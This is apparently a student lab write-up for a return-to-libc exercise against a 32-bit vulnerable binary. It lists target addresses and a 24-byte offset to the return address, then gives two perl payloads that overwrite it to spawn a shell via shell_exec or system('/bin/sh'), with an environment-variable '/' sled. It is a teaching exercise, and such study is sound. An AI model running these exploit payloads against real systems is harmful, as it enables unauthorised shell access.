# Return-to-libc Attack

## Logistics

1. address of `shell_exec` is **0x804847d**.

2. `system@plt` is located at **0x8048350**.

3. the distance between **buff** and **RET** is 24 bytes.

## Part 1 - Return to shell_exec

Given the above information, we are able to construct the payload:

```bash
perl -e 'print "A"x24, "\x7d\x84\x4\x8"'
```

## Part 2 - Return to system

### Load "/bin/sh" into environment

Export the "/bin/sh" value with "/" sled. Or, add the following line to `~/.profile`

```bash
MY_SHELL=$(perl -e 'print "/"x60, "/bin/sh"') 
```

Use gdb, approximate its memory address to be **0xbffffefd**.

Now we have:

1. address of `system@plt`.
2. address (with the "/" sled) of "/bin/sh".
3. distance between **buff** and **RET** of `str_copy`.

We can therefore construct our payload to be

```bash
perl -e 'print "A"x24, "\x50\x83\x4\x8", "A"x4, "\xfd\xfe\xff\xbf"'
```